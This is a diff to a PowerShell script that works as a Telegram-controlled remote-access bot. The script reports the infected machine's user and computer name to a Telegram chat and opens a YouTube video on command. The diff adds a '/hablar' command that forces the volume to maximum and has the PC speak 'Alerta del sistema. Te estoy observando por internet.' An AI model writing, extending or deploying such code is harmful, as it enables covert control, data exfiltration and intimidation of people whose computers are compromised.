@@ -77,7 +77,7 @@ while ($true) {
 
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
-                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
+                    $RespuestaLista = "ver 4🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $MiIDNum + "] -> " + $User + "@" + $MiPC
                     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                     continue
                 }
@@ -125,6 +125,27 @@ while ($true) {
                             Start-Process $UrlFija
                             
                             $Respuesta = "Abriendo el video predefinido de YouTube en ID $MiIDNum"
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
+                            continue
+                        }
+                        "/hablar" {
+                            # 1. Creamos el objeto de control del sistema de Windows
+                            $wshShell = New-Object -ComObject WScript.Shell
+                            
+                            # 2. Sube el volumen al 100% (Manda la señal de 'Subir Volumen' 50 veces seguidas)
+                            for ($i = 0; $i -lt 50; $i++) {
+                                $wshShell.SendKeys([char]175)
+                            }
+
+                            # 3. CAMBIÁ ESTA FRASE: Poné entre comillas lo que querés que diga la PC
+                            $FraseFija = "Alerta del sistema. Te estoy observando por internet."
+
+                            # 4. Invoca el motor de voz de Windows y reproduce el texto fijo
+                            $Voice = New-Object -ComObject SAPI.SpVoice
+                            [void]$Voice.Speak($FraseFija)
+                            
+                            # 5. Notificación de éxito a Telegram
+                            $Respuesta = "Volumen maximizado y frase reproducida en ID $MiIDNum"
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                             continue
                         }
